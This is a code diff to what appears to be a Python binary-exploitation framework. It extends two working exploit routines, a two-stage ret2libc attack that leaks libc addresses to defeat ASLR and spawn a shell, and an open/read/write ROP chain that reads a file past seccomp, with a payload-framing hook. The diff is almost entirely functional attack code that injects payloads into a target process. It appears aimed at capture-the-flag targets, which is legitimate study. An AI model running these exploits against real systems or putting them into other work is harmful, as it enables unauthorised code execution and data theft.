@@ -327,7 +327,7 @@ def ret2libc_leak(exe, workdir, *, offset, pop_rdi, puts_plt, puts_got, ret_to,
                   puts_off, system_off, binsh_off, ret_gadget=None, one_gadgets=(),
                   base_argv=(), marker: bytes = b"LYKOS_R2L_9931", timeout: float = 8.0,
                   mem_mb: int = 2048, leaker: str = "puts", pop_rsi=None, pop_rdx=None,
-                  write_plt=None) -> dict:
+                  write_plt=None, frame=None) -> dict:
     """Two-stage ret2libc that defeats ASLR with a puts() info-leak, confirmed by a spawned shell.
 
     Stage 1 (`build_leak_puts`) calls puts(puts@GOT), printing the libc address of puts as raw
@@ -344,8 +344,10 @@ def ret2libc_leak(exe, workdir, *, offset, pop_rdi, puts_plt, puts_got, ret_to,
 
     `one_gadgets` are libc OFFSETS (relocated to base+offset at runtime). Success = the spawned
     shell EVALUATES the forgery-proof marker, which a crash, a wrong address, or a reflected input
-    can never produce. Returns {ok, base, leaked, align, technique, ...}.
+    can never produce. `frame` wraps each OVERFLOW stage in the structure L2 measured around it
+    (both stages re-enter the same parse). Returns {ok, base, leaked, align, technique, stage1}.
     """
+    _f = frame or (lambda b: b)
     from . import attribution, rop
     # Forgery-proof confirmation: a bare `echo <marker>` is reflected verbatim by a target that
     # merely echoes stdin (no shell), so `marker in out` false-positives. The code markers embed
@@ -399,6 +401,7 @@ def ret2libc_leak(exe, workdir, *, offset, pop_rdi, puts_plt, puts_got, ret_to,
                     else:
                         s1 = rop.build_leak_puts(offset, pop_rdi=pop_rdi, got=puts_got,
                                                  puts_plt=puts_plt, ret_to=ret_to, ret_gadget=None)
+                    s1 = _f(s1)
                     try:
                         p.stdin.write(s1)
                         p.stdin.flush()
@@ -416,7 +419,7 @@ def ret2libc_leak(exe, workdir, *, offset, pop_rdi, puts_plt, puts_got, ret_to,
                     last_leaked = leaked
                     if not base:
                         continue                          # not the pointer we assumed; retry/parity
-                    s2 = build_s2(base, align)
+                    s2 = _f(build_s2(base, align))
                     try:
                         p.stdin.write(s2)
                         p.stdin.flush()
@@ -430,7 +433,8 @@ def ret2libc_leak(exe, workdir, *, offset, pop_rdi, puts_plt, puts_got, ret_to,
                     out = _read_until(p, time.time() + timeout, quiet=1.5)
                     if markers.proves(out):               # a shell EVALUATED it, not an echo
                         r = {"ok": True, "base": base, "leaked": leaked, "align": align,
-                             "technique": tech, "output": out[:400].decode("latin-1", "ignore")}
+                             "technique": tech, "stage1": s1,
+                             "output": out[:400].decode("latin-1", "ignore")}
                         if tech == "ret2libc":
                             r["system"], r["binsh"] = base + system_off, base + binsh_off
                         else:
@@ -772,12 +776,15 @@ def analyst_ret2libc(exe, workdir, *, offset, libc_data, leak_offset=None, leak_
 def orw_leak(exe, workdir, *, offset, pop_rdi, pop_rsi, pop_rdx, puts_plt, puts_got, ret_to,
              puts_off, open_off, read_off, write_off, scratch=None, scratch_off=None,
              flag_path=b"flag", flag_marker=b"", ret_gadget=None, leaker="puts", write_plt=None,
-             base_argv=(), timeout: float = 8.0, mem_mb: int = 2048) -> dict:
+             base_argv=(), timeout: float = 8.0, mem_mb: int = 2048, frame=None) -> dict:
     """Two-stage leak + open/read/write: stage 1 leaks libc (puts/write of a GOT slot) and returns to
     the loop; stage 2 runs an ORW ROP that reads `flag_path` and writes it to stdout. Used when a
     seccomp filter blocks execve so system("/bin/sh") can never confirm. Confirmation is the
     DISCLOSURE itself -- `flag_marker` (planted only in the file, never sent as input) appearing in
-    the output proves the chain opened+read the file. Returns {ok, base, disclosed}."""
+    the output proves the chain opened+read the file. `frame` wraps each OVERFLOW stage in the
+    structure L2 measured (the path is read raw by the chain). Returns {ok, base, align, stage1,
+    disclosed}."""
+    _f = frame or (lambda b: b)
 
     from . import rop
     exedir = str(Path(exe).resolve().parent)
@@ -803,6 +810,7 @@ def orw_leak(exe, workdir, *, offset, pop_rdi, pop_rsi, pop_rdx, puts_plt, puts_
                 else:
                     s1 = rop.build_leak_puts(offset, pop_rdi=pop_rdi, got=puts_got,
                                              puts_plt=puts_plt, ret_to=ret_to)
+                s1 = _f(s1)
                 try:
                     p.stdin.write(s1); p.stdin.flush()
                 except (BrokenPipeError, OSError):
@@ -825,6 +833,7 @@ def orw_leak(exe, workdir, *, offset, pop_rdi, pop_rsi, pop_rdx, puts_plt, puts_
                                        open_fn=base + open_off, read_fn=base + read_off,
                                        write_fn=base + write_off, scratch=eff_scratch,
                                        path_len=len(path_blob) + 8, ret_gadget=align)
+                s2 = _f(s2)
                 try:
                     p.stdin.write(s2); p.stdin.flush()
                     time.sleep(0.2)
@@ -834,7 +843,7 @@ def orw_leak(exe, workdir, *, offset, pop_rdi, pop_rsi, pop_rdx, puts_plt, puts_
                     break
                 out = _read_until(p, time.time() + timeout, quiet=1.2)
                 if flag_marker and flag_marker in out:
-                    return {"ok": True, "base": base, "align": align,
+                    return {"ok": True, "base": base, "align": align, "stage1": s1,
                             "disclosed": out[:400].decode("latin-1", "ignore")}
             finally:
                 for s in (p.stdin, p.stdout):
